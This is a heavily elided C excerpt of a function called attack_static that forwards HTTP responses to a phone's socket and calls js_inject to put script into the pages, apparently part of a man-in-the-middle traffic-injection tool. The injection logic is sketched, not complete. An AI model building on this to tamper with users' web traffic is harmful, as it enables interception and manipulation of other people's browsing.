...
int attack_static(webserverinfo_t *webserver)
{
	...
	if (webserver->respons->datalen > 0)
	{
		while (1)
		{
			...
			webserver->swap_buf->datalen = strline(respons, webserver->swap_buf->buf);
			if (webserver->swap_buf->datalen <= 0)
				break;

			offset += webserver->swap_buf->datalen;

			if (isStrnexit(webserver->swap_buf->buf, webserver->swap_buf->datalen, "Content-Length:", 15)
			...
			ret = socket_send(webserver->phonefd, webserver->swap_buf->buf, webserver->swap_buf->datalen);
	...
	while (webserver->tmp > 0)
	{
...
#if 1
		ret = js_inject(webserver->phonefd, &context, &contextlen, url, url_len, 
		...
		ret = socket_send(webserver->phonefd, chunkedsize, len);
		if (ret != len)
		{
		...
		ret = socket_send(webserver->phonefd, context, contextlen);
		if (ret != contextlen)
		{
			LOG_ERROR_INFO("send context to phone error! datalen = %d, ret = %d\n", 
